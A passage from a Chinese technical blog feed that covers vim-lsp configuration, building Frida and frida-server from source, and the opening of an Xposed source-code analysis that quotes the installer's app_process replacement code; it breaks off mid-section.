<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; Plugins will be downloaded under the specified directory.</span></span><br><span class="line"><span class="string">call plug#begin(&#x27;~/.vim/plugged&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> 声明需要安装的插件</span><br><span class="line">Plug <span class="string">&#x27;prabirshrestha/vim-lsp&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;mattn/vim-lsp-settings&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;prabirshrestha/asyncomplete.vim&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;prabirshrestha/asyncomplete-lsp.vim&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;piec/vim-lsp-clangd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; List ends here. Plugins become visible to Vim after this call.</span></span><br><span class="line"><span class="string">call plug#end()</span></span><br></pre></td></tr></table></figure>
<p>更多信息参考：<a href="https://github.com/junegunn/vim-plug">https://github.com/junegunn/vim-plug</a></p>
<h2 id="安装-vim-lsp"><a href="#安装-vim-lsp" class="headerlink" title="安装 vim-lsp"></a>安装 vim-lsp</h2><p>安装 vim-lsp 插件比较简单，上面安装 vim-plug 插件中已经安装好了。</p>
<p>这里主要讲一下注册服务。</p>
<p>例如：注册 python 服务。</p>
<p>首先安装 <code>python-language-server</code>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install python-language-server</span><br></pre></td></tr></table></figure>

<p>然后在 <code>~/.vimrc</code> 中，添加下列内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> executable(<span class="string">&#x27;pyls&#x27;</span>)</span><br><span class="line">    au User lsp_setup call lsp<span class="comment">#register_server(&#123;</span></span><br><span class="line">        \ <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;pyls&#x27;</span>,</span><br><span class="line">        \ <span class="string">&#x27;cmd&#x27;</span>: &#123;server_info-&gt;[<span class="string">&#x27;pyls&#x27;</span>]&#125;,</span><br><span class="line">        \ <span class="string">&#x27;whitelist&#x27;</span>: [<span class="string">&#x27;python&#x27;</span>],</span><br><span class="line">        \ &#125;)</span><br><span class="line">endif</span><br></pre></td></tr></table></figure>
<p>更详细的信息参考： <a href="https://github.com/prabirshrestha/vim-lsp/wiki/Servers-Python">https://github.com/prabirshrestha/vim-lsp/wiki/Servers-Python</a> 。</p>
<p>例如：安装 Clangd - C&#x2F;C++ 。</p>
<p>首先安装 llvm。</p>
<p>然后将下面内容添加到 中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> executable(<span class="string">&#x27;clangd&#x27;</span>)</span><br><span class="line">    au User lsp_setup call lsp<span class="comment">#register_server(&#123;</span></span><br><span class="line">        \ <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;clangd&#x27;</span>,</span><br><span class="line">        \ <span class="string">&#x27;cmd&#x27;</span>: &#123;server_info-&gt;[<span class="string">&#x27;clangd&#x27;</span>, <span class="string">&#x27;-background-index&#x27;</span>]&#125;,</span><br><span class="line">        \ <span class="string">&#x27;whitelist&#x27;</span>: [<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;cpp&#x27;</span>, <span class="string">&#x27;objc&#x27;</span>, <span class="string">&#x27;objcpp&#x27;</span>],</span><br><span class="line">        \ &#125;)</span><br><span class="line">endif</span><br></pre></td></tr></table></figure>
<p>最后安装 <code>piec/vim-lsp-clangd</code> 插件。</p>
<img src="/2020/03/21/vim%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86%E8%AE%B0%E5%BD%95/2021-11-23-20-09-17.png" class="" title="效果图">

<p>更多信息请参考：<a href="https://github.com/prabirshrestha/vim-lsp/wiki">https://github.com/prabirshrestha/vim-lsp/wiki</a> 。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>window下编译Frida</title>
    <url>/2021/08/17/window%E4%B8%8B%E7%BC%96%E8%AF%91Frida/</url>
    <content><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>安装 <code>VS2019</code> 选择 使用 <code>C++</code> 的桌面开发 ，并选择 对 <code>VS2017</code>（v141） 工具的 C++ Window XP 支持[已弃用] 组件，如下图所示。</p>
<img src="/2021/08/17/window%E4%B8%8B%E7%BC%96%E8%AF%91Frida/2021-08-17-22-08-29.png" class="">

<p>安装 <code>git</code> 和 <code>nodejs</code> , 并加入环境变量。</p>
<p>安装 <code>python3.8</code> ，安装目录为 <code>C:\Program Files (x86)\Python 3.8\</code> ，安装选项如下图所示。</p>
<img src="/2021/08/17/window%E4%B8%8B%E7%BC%96%E8%AF%91Frida/2021-08-17-22-12-47.png" class="">

<img src="/2021/08/17/window%E4%B8%8B%E7%BC%96%E8%AF%91Frida/2021-08-17-22-13-45.png" class="">

<p>这里需要注意， <code>python</code> 最好安装在系统盘，因为安装在其他盘在编译过程中可能会出现 <code>python</code> 执行子命令权限不足的情况。</p>
<p>安装好以上应用之后，在 <code>cmd</code> 中应该可以执行 <code>git</code> , <code>node</code> , <code>python</code>, <code>py</code> 这些命令。</p>
<h1 id="下载-Frida-源码并编译"><a href="#下载-Frida-源码并编译" class="headerlink" title="下载 Frida 源码并编译"></a>下载 Frida 源码并编译</h1><p>下载 Frida 源码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --recurse-submodules https://github.com/frida/frida</span><br></pre></td></tr></table></figure>
<p>等待源码下载完成，然后进入源码目录，执行下列命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ powershell</span><br><span class="line">PS&gt; Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted</span><br><span class="line">PS&gt; .\releng\stage-python.ps1</span><br></pre></td></tr></table></figure>

<img src="/2021/08/17/window%E4%B8%8B%E7%BC%96%E8%AF%91Frida/2021-08-17-22-21-17.png" class="">

<p>等待命令运行完成，然后打开 <code>frida.sln</code> 文件直接 <code>F7</code> 编译源码。</p>
<p>在编译过程中，可能会出现下列错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">严重性	代码	说明	项目	文件	行	禁止显示状态</span><br><span class="line">错误	C2001	常量中有换行符	frida-core	e:\study\frida\build\tmp-windows\win32-debug\frida-core\src\fruity\keyed-archive.c	1050	</span><br><span class="line">严重性	代码	说明	项目	文件	行	禁止显示状态</span><br><span class="line">错误	C2146	语法错误: 缺少“)”(在标识符“_inner_error0_”的前面)	frida-core	e:\study\frida\build\tmp-windows\win32-debug\frida-core\src\fruity\keyed-archive.c	1051	</span><br></pre></td></tr></table></figure>
<p>这里需要将 <code>keyed-archive.c</code> 文件中的 <code>“%s”</code>换成 <code>&#39;%s&#39;</code> ，这是由于相应的 <code>c</code> 文件 <code>keyed-archive.c</code>  来源于 <code>vala</code> 文件 <code>keyed-archive.vala</code> ，所以需要将对应 <code>valva</code> 里的所有宽字符 <code>“”</code> 替换为 <code>&#39;&#39;</code> 。</p>
<img src="/2021/08/17/window%E4%B8%8B%E7%BC%96%E8%AF%91Frida/2021-08-17-22-31-57.png" class="">

<p>以上的所有错误修改完后，再编译即可成功.</p>
<h1 id="编译-frida-server"><a href="#编译-frida-server" class="headerlink" title="编译 frida-server"></a>编译 frida-server</h1><blockquote>
<p>环境：Ubuntu 18.04 </p>
</blockquote>
<p>根据官方文档，配置必要的环境，其中官方文档中提到的 <code>lib32stdc++-9-dev</code> 库安装不了，但是最后编译是没有问题的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install build-essential curl git libc6-dev-i386 nodejs npm python3-dev python3-pip</span><br></pre></td></tr></table></figure>

<p>配置 <code>ndk</code> 环境变量。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> ANDROID_NDK_ROOT=/home/ckcat/snap/sdk/ndk/22.1.7171670</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$ANDROID_NDK_ROOT</span>:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<p>然后进入 <code>frida</code> 源码目录，执行下列命令进行编译。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make core-android-arm64    <span class="comment"># 编译 arm64 的 frida-server</span></span><br><span class="line">make core-android-arm        <span class="comment"># 编译 arm 的 frida-server</span></span><br></pre></td></tr></table></figure>
<p>执行以上命令，会自动下载对应的 <code>toolchain</code> 和 <code>sdk</code> ，编译好的</p>
<img src="/2021/08/17/window%E4%B8%8B%E7%BC%96%E8%AF%91Frida/2021-08-18-14-51-13.png" class="">


<p>如果因为网络原因无法自动下载，可以手动下载，官方 <code>toolchain</code> 和 <code>sdk</code> 下载地址如下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://build.frida.re/deps/20210123/toolchain-linux-x86_64.tar.bz2</span><br><span class="line">https://build.frida.re/deps/20210123/sdk-linux-x86_64.tar.bz2</span><br><span class="line">https://build.frida.re/deps/20210123/sdk-android-arm.tar.bz2</span><br><span class="line">https://build.frida.re/deps/20210123/sdk-android-arm64.tar.bz2</span><br></pre></td></tr></table></figure>
<p>其中 <code>20210123</code> 是 <code>frida</code> 中 <code>releng/deps.mk</code> 中的 <code>frida_deps_version</code> 。</p>
<p>下载完之后，解压至 <code>frida/build</code> 目录，然后再执行上面的编译命令即可。（这个操作我没有试过，所以可能有坑，但是问题应该不大。）</p>
<blockquote>
<p>这里要说明一点，我使用的 <code>Ubuntu 18.04</code> 此前编译过 <code>Android</code> 系统，所以可能装的库比较齐全，如果安装上面的库以后还是编译不了，那么就根据报错信息安装对应的库就好了。</p>
</blockquote>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://frida.re/docs/building/<span class="comment">#windows</span></span><br><span class="line">https://bbs.pediy.com/thread-267015.htm</span><br><span class="line">https://blog.seeflower.dev/archives/16/</span><br><span class="line">https://github.com/hluwa/strongR-frida-android/blob/main/.github/workflows/build.yml</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>frida</category>
      </categories>
      <tags>
        <tag>frida</tag>
      </tags>
  </entry>
  <entry>
    <title>xposde源码分析</title>
    <url>/2020/02/12/xposed%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<!-- TOC -->

<ul>
<li><a href="#xposed%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90%E6%A6%82%E8%BF%B0">Xposed源码剖析——概述</a><ul>
<li><a href="#xposedinstaller%E7%9A%84%E6%9E%84%E6%88%90">XposedInstaller的构成</a></li>
<li><a href="#xposed%E5%8E%9F%E7%90%86">Xposed原理</a></li>
<li><a href="#xposed%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%A1%88">Xposed的实现方案</a></li>
</ul>
</li>
<li><a href="#xposed-%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90--app_process-%E4%BD%9C%E7%94%A8%E8%AF%A6%E8%A7%A3">Xposed 源码剖析 —— app_process 作用详解</a><ul>
<li><a href="#app_maincpp-%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B8%8E%E5%AF%B9%E6%AF%94">app_main.cpp 源码阅读与对比</a></li>
<li><a href="#xposedbridgejava">XposedBridge.java</a></li>
</ul>
</li>
<li><a href="#xposed%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90xposed%E5%88%9D%E5%A7%8B%E5%8C%96">Xposed源码剖析——Xposed初始化</a><ul>
<li><a href="#xposedinitialize%E5%88%9D%E5%A7%8B%E5%8C%96">xposed::initialize初始化</a></li>
<li><a href="#onvmcreated-%E5%88%9D%E5%A7%8B%E5%8C%96%E5%90%8E%E7%9A%84%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">onVmCreated 初始化后的准备工作</a></li>
<li><a href="#libxposed_dalvikcpp-hook-%E7%8E%AF%E5%A2%83%E5%88%9D%E5%A7%8B%E5%8C%96">libxposed_dalvik.cpp hook 环境初始化</a></li>
<li><a href="#jni%E6%96%B9%E6%B3%95%E6%B3%A8%E5%86%8C%E9%80%BB%E8%BE%91">JNI方法注册逻辑</a></li>
</ul>
</li>
<li><a href="#xposed-%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-hook-%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0">Xposed 源码剖析—— hook 具体实现</a></li>
</ul>
<!-- /TOC -->

<h1 id="Xposed源码剖析——概述"><a href="#Xposed源码剖析——概述" class="headerlink" title="Xposed源码剖析——概述"></a>Xposed源码剖析——概述</h1><p>XPosed 是与 Cydia 其名的工具，它能够让 Android 设备在没有修改源码的情况下修改系统中的 API 运行结果。我们通常称之为：God Mode（上帝模式）。</p>
<p>之前享大家分享了 Xposed 的基础，Xposed 的作用和最简单的用法。那么，它的原理和它的内部构造是如何构成的？下面，我们从 Github 上看看，rovo89 大神是如何制作的。</p>
<p>rovo89的github地址：<a href="https://github.com/rovo89">https://github.com/rovo89</a></p>
<p>在主页上我们看到了，xposed 其实主要是由三个项目来组成的，如下图所示；</p>
<img src="/2020/02/12/xposed%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2020-02-12-01-17-48.png" class="">

<p>三个分别是：</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Xposed</td>
<td>Xposed 框架的 native 部分（主要是改性 app_process 二进制文件）</td>
</tr>
<tr>
<td>XposedInstaller</td>
<td>Xposed 框架的 Android 端本地管理，环境架构搭建，以及第三方 module 资源下载的工具。</td>
</tr>
<tr>
<td>XposedBridge</td>
<td>Xposed 向开发者提供的 API 与相应的工具类库</td>
</tr>
</tbody></table>
<h2 id="XposedInstaller的构成"><a href="#XposedInstaller的构成" class="headerlink" title="XposedInstaller的构成"></a>XposedInstaller的构成</h2><p>Xposed 项目使我们最常用的项目，当然，他也是构造 Xposed 的核心部分。</p>
<p>如下图所示，是我们在 XPosedInstaller apk 中见到的，安装 xposed 框架的界面。</p>
<img src="/2020/02/12/xposed%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2020-02-12-01-19-33.png" class="">

<p>InstallerFragment 我们能够在其中找到 install 方法，其中主要就是针对使用不同方式的将自定义的 app_process 文件替换掉系统的 app_process 文件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * xposed install</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 安装成功返回true，否则false</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">install</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取安装的方式，直接写入 or 使用 recovery进行安装</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">installMode</span> <span class="operator">=</span> getInstallMode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查获取Root权限</span></span><br><span class="line">    <span class="keyword">if</span> (!startShell())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    List&lt;String&gt; messages = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;String&gt;();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">showAlert</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        messages.add(getString(R.string.sdcard_location, XposedApp.getInstance().getExternalFilesDir(<span class="literal">null</span>)));</span><br><span class="line">        messages.add(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        messages.add(getString(R.string.file_copying, <span class="string">&quot;Xposed-Disabler-Recovery.zip&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 把Xposed-Disabler-Recovery.zip文件 从asset copy到sdcard中</span></span><br><span class="line">        <span class="keyword">if</span> (AssetUtil.writeAssetToSdcardFile(<span class="string">&quot;Xposed-Disabler-Recovery.zip&quot;</span>, <span class="number">00644</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">            messages.add(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            messages.add(getString(R.string.file_extract_failed, <span class="string">&quot;Xposed-Disabler-Recovery.zip&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将编译后的app_process二进制文件，从asset文件夹中，copy到/data/data/de.robv.android.xposed.installer/bin/app_process下</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">appProcessFile</span> <span class="operator">=</span> AssetUtil.writeAssetToFile(APP_PROCESS_NAME, <span class="keyword">new</span> <span class="title class_">File</span>(XposedApp.BASE_DIR + <span class="string">&quot;bin/app_process&quot;</span>), <span class="number">00700</span>);</span><br><span class="line">        <span class="keyword">if</span> (appProcessFile == <span class="literal">null</span>) &#123;</span><br><span class="line">            showAlert(getString(R.string.file_extract_failed, <span class="string">&quot;app_process&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (installMode == INSTALL_MODE_NORMAL) &#123;</span><br><span class="line">            <span class="comment">// 普通安装模式</span></span><br><span class="line">            <span class="comment">// 重新挂载/system为rw模式</span></span><br><span class="line">            messages.add(getString(R.string.file_mounting_writable, <span class="string">&quot;/system&quot;</span>));</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">&quot;mount -o remount,rw /system&quot;</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(getString(R.string.file_mount_writable_failed, <span class="string">&quot;/system&quot;</span>));</span><br><span class="line">                messages.add(getString(R.string.file_trying_to_continue));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 查看原有的app_process文件是否已经备份，如果没有备份，现将原有的app_process文件备份一下</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/system/bin/app_process.orig&quot;</span>).exists()) &#123;</span><br><span class="line">                messages.add(getString(R.string.file_backup_already_exists, <span class="string">&quot;/system/bin/app_process.orig&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">&quot;cp -a /system/bin/app_process /system/bin/app_process.orig&quot;</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                    messages.add(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                    messages.add(getString(R.string.file_backup_failed, <span class="string">&quot;/system/bin/app_process&quot;</span>));</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    messages.add(getString(R.string.file_backup_successful, <span class="string">&quot;/system/bin/app_process.orig&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                mRootUtil.executeWithBusybox(<span class="string">&quot;sync&quot;</span>, messages);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将项目中的自定义app_process文件copy覆盖系统的app_process,修改权限</span></span><br><span class="line">            messages.add(getString(R.string.file_copying, <span class="string">&quot;app_process&quot;</span>));</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">&quot;cp -a &quot;</span> + appProcessFile.getAbsolutePath() + <span class="string">&quot; /system/bin/app_process&quot;</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                messages.add(getString(R.string.file_copy_failed, <span class="string">&quot;app_process&quot;</span>, <span class="string">&quot;/system/bin&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">&quot;chmod 755 /system/bin/app_process&quot;</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                messages.add(getString(R.string.file_set_perms_failed, <span class="string">&quot;/system/bin/app_process&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">&quot;chown root:shell /system/bin/app_process&quot;</span>, messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                messages.add(getString(R.string.file_set_owner_failed, <span class="string">&quot;/system/bin/app_process&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (installMode == INSTALL_MODE_RECOVERY_AUTO) &#123;</span><br><span class="line">            <span class="comment">// 自动进入Recovery</span></span><br><span class="line">            <span class="keyword">if</span> (!prepareAutoFlash(messages, <span class="string">&quot;Xposed-Installer-Recovery.zip&quot;</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (installMode == INSTALL_MODE_RECOVERY_MANUAL) &#123;</span><br><span class="line">            <span class="comment">// 手动进入Recovery</span></span><br><span class="line">            <span class="keyword">if</span> (!prepareManualFlash(messages, <span class="string">&quot;Xposed-Installer-Recovery.zip&quot;</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">blocker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(XposedApp.BASE_DIR + <span class="string">&quot;conf/disabled&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (blocker.exists()) &#123;</span><br><span class="line">            messages.add(getString(R.string.file_removing, blocker.getAbsolutePath()));</span><br><span class="line">            <span class="keyword">if</span> (mRootUtil.executeWithBusybox(<span class="string">&quot;rm &quot;</span> + blocker.getAbsolutePath(), messages) != <span class="number">0</span>) &#123;</span><br><span class="line">                messages.add(<span class="string">&quot;&quot;</span>);</span><br><span class="line">                messages.add(getString(R.string.file_remove_failed, blocker.getAbsolutePath()));</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// copy XposedBridge.jar 到私有目录 XposedBridge.jar是Xposed提供的jar文件，负责在Native层与FrameWork层进行交互</span></span><br><span class="line">        messages.add(getString(R.string.file_copying, <span class="string">&quot;XposedBridge.jar&quot;</span>));</span><br><span class="line">        <span class="type">File</span> <span class="variable">jarFile</span> <span class="operator">=</span> AssetUtil.writeAssetToFile(<span class="string">&quot;XposedBridge.jar&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(JAR_PATH_NEWVERSION), <span class="number">00644</span>);</span><br><span class="line">        <span class="keyword">if</span> (jarFile == <span class="literal">null</span>) &#123;</span><br><span class="line">            messages.add(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            messages.add(getString(R.string.file_extract_failed, <span class="string">&quot;XposedBridge.jar&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mRootUtil.executeWithBusybox(<span class="string">&quot;sync&quot;</span>, messages);</span><br><span class="line"></span><br><span class="line">        showAlert = <span class="literal">false</span>;</span><br><span class="line">        messages.add(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (installMode == INSTALL_MODE_NORMAL) &#123;</span><br><span class="line">            offerReboot(messages);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            offerRebootToRecovery(messages, <span class="string">&quot;Xposed-Installer-Recovery.zip&quot;</span>, installMode);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 删除busybox 工具库</span></span><br><span class="line">        AssetUtil.removeBusybox();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (showAlert)</span><br><span class="line">            showAlert(TextUtils.join(<span class="string">&quot;\n&quot;</span>, messages).trim());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们看完了代码，发现所有的工作都是为了 app_process 文件的替换。那么，系统中这个 app_process 是做什么的？为什么我们需要替换？替换成什么样？替换后对于我们么来说有什么帮助呢？</p>
<h2 id="Xposed原理"><a href="#Xposed原理" class="headerlink" title="Xposed原理"></a>Xposed原理</h2><p>我们在 android 的源码中的 <code>init.rc</code> 文件可以看到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service zygote /system/bin/app_process -Xzygote /system/bin –zygote –start-system-server</span><br><span class="line">socket zygote stream 666 </span><br><span class="line">onrestart write /sys/android_power/request_state wake</span><br><span class="line">onrestart write /sys/power/state on</span><br><span class="line">onrestart restart media</span><br><span class="line">onrestart restart netd</span><br></pre></td></tr></table></figure>
<p>app_process 是 andriod app 的启动程序（具体形式是 zygote <code>fork()</code> 调用一个  app_process 作为 Android app 的载体）。</p>
<h2 id="Xposed的实现方案"><a href="#Xposed的实现方案" class="headerlink" title="Xposed的实现方案"></a>Xposed的实现方案</h2><p>针对 Hook 的不同进程来说又可以分为全局 Hook 与单个应用程序进程 Hook ，我们知道在 Android 系统中，应用程序进程都是由 Zygote 进程孵化出来的，而 Zygote 进程是由 Init 进程启动的。</p>
<p>Zygote 进程在启动时会创建一个 Dalvik 虚拟机实例，每当它孵化一个新的应用程序进程时，都会将这个 Dalvik 虚拟机实例复制到新的应用程序进程里面去，从而使得每一个应用程序进程都有一个独立的 Dalvik 虚拟机实例。所以如果选择对 Zygote 进程 Hook ，则能够达到针对系统上所有的应用程序进程 Hook ，即一个全局 Hook 。如下图所示：</p>
<img src="/2020/02/12/xposed%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2021-09-03-14-36-00.png" class="">


<h1 id="Xposed-源码剖析-——-app-process-作用详解"><a href="#Xposed-源码剖析-——-app-process-作用详解" class="headerlink" title="Xposed 源码剖析 —— app_process 作用详解"></a>Xposed 源码剖析 —— app_process 作用详解</h1><p>上面我们分析 Xposed 项目的源码，从 XposedInstaller 开始说明了 Xposed 安装的原理与过程。我们知道，XposedInstaller 主要的工作就是：</p>
<ul>
<li>替换系统的 app_process（当然，这个操作需要 Root 权限）</li>
<li>将 xposed 的 api 文件，<code>XposedBridge.jar</code> 文件放置到私有目录中</li>
</ul>
<p>至于为什么要替换 app_process 文件？</p>
<p>系统中的 app_process 文件有什么作用？</p>
<p>替换后的 app_process 为什么能够帮助我们hook？</p>
<p>下面我们就开始看看， rovo89 大神的 xposed 开源项目。从 GitHub 上面 clone 下来 xposed 项目，我们在目录中看到其目录结构，如下所示：</p>
<img src="/2020/02/12/xposed%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2020-02-12-01-22-42.png" class="">

<p>从目录中，我们能够清楚的了解到，其中 xposed 项目现在已经支持 Dalvik 虚拟机与 art 虚拟机的架构了。</p>
<h2 id="app-main-cpp-源码阅读与对比"><a href="#app-main-cpp-源码阅读与对比" class="headerlink" title="app_main.cpp 源码阅读与对比"></a><code>app_main.cpp</code> 源码阅读与对比</h2><p>我们先从 app_process 的源码开始阅读，打开 <code>app_main.cpp</code> 文件，估计大家和我一下，一时间也看不出来 xposed 针对源码修改了一些什么。</p>
<p>那么，我们就直接拿源码与 xposed 中的 <code>app_main.cpp</code> 进行对比。</p>
<p>源码地址：<code>/frameworks/base/cmds/app_process/app_main.cpp</code></p>
<p>发现了，rovo89 针对了一下几个地方进行了修改。</p>
<p><strong>atrace_set_tracing_enabled 进行了替换修改</strong></p>
<img src="/2020/02/12/xposed%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2020-02-12-01-23-35.png" class="">

<p><strong>onVmCreated 增加了 Xposed 的回调</strong></p>
<img src="/2020/02/12/xposed%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2020-02-12-01-24-05.png" class="">

<p><strong>main 函数中，增加了 xposed 的 options 操作</strong></p>
<img src="/2020/02/12/xposed%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2020-02-12-01-24-34.png" class="">

<p>我们在 <code>xposed.cpp</code> 中，能够看到其 handleOptions 的具体逻辑，其实就是处理一些 xposed 的特殊命令而已。如下所示：</p>
